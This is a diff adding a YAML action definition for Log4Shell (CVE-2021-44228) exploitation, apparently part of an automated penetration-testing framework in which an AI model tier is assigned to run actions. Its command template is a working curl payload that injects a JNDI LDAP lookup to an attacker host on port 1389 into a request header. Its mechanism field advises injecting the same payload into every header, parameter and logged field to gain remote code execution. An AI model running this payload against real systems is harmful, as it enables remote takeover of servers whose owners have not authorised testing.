@@ -1,0 +1,16 @@
+name: log4shell
+category: services
+description: Log4Shell exploitation (CVE-2021-44228)
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -H 'X-Api-Version: ${{jndi:ldap://{attacker_ip}:1389/exploit}}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Log4j JNDI injection: ${jndi:ldap://attacker/a} triggers LDAP lookup → Java deserialization RCE. Test in all headers, parameters, user-agent. Inject in any logged field."
